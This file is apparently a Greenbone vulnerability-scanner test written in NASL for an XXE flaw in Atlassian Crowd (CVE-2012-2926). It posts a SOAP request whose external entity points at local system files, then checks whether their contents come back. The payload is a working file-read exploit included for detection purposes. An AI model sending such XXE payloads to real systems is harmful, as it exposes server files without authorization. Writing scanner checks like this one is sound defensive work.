CPE = "cpe:/a:atlassian:crowd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103512" );
	script_bugtraq_id( 53595 );
	script_cve_id( "CVE-2012-2926" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:P" );
	script_version( "2021-08-27T12:01:24+0000" );
	script_name( "Atlassian Crowd XML Parsing Denial of Service Vulnerability" );
	script_tag( name: "last_modification", value: "2021-08-27 12:01:24 +0000 (Fri, 27 Aug 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-08-06 16:05:00 +0000 (Thu, 06 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_atlassian_crowd_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "atlassian_crowd/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53595" );
	script_xref( name: "URL", value: "https://jira.atlassian.com/browse/JRA-27719" );
	script_xref( name: "URL", value: "http://www.atlassian.com/software/jira/" );
	script_xref( name: "URL", value: "http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2012-05-17" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Atlassian Crowd does not properly restrict the capabilities of third-party
  XML parsers, which allows remote attackers to read arbitrary files or cause a denial of
  service (resource consumption) via unspecified vectors." );
	script_tag( name: "affected", value: "Crowd before 2.0.9, 2.1 before 2.1.2, 2.2 before 2.2.9, 2.3 before 2.3.7,
  and 2.4 before 2.4.1." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/crowd/services";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(!buf || !ContainsString( buf, "Invalid SOAP request" )){
	exit( 0 );
}
files = traversal_files();
useragent = http_get_user_agent();
host = http_host_name( port: port );
entity = rand_str( length: 8, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
for pattern in keys( files ) {
	file = files[pattern];
	soap = "<!DOCTYPE foo [<!ENTITY " + entity + " SYSTEM \"file:///" + file + "\"> ]>
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:SecurityServer\" xmlns:aut=\"http://authentication.integration.crowd.atlassian.com\" xmlns:soap=\"http://soap.integration.crowd.atlassian.com\">
<soapenv:Header/>
<soapenv:Body>
<urn:addAllPrincipals>
<urn:in0>
<!--Optional:-->
<aut:name>?</aut:name>
<!--Optional:-->
<aut:token>?</aut:token>
</urn:in0>
<urn:in1>
<!--Zero or more repetitions:-->
<soap:SOAPPrincipalWithCredential>
<!--Optional:-->
<soap:passwordCredential>
<!--Optional:-->
<aut:credential>?</aut:credential>
<!--Optional:-->
<aut:encryptedCredential>?&" + entity + ";</aut:encryptedCredential>
</soap:passwordCredential>
<!--Optional:-->
<soap:principal>
<!--Optional:-->
<soap:ID>?</soap:ID>
<!--Optional:-->
<soap:active>?</soap:active>
<!--Optional:-->
<soap:attributes>
<!--Zero or more repetitions:-->
<soap:SOAPAttribute>
<!--Optional:-->
<soap:name>?</soap:name>
<!--Optional:-->
<soap:values>
<!--Zero or more repetitions:-->
<urn:string>?</urn:string>
</soap:values>
</soap:SOAPAttribute>
</soap:attributes>";
	len = strlen( soap );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "SOAPAction: ", "\"\"", "\\r\\n", "Content-Type: text/xml; charset=UTF-8\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", soap );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

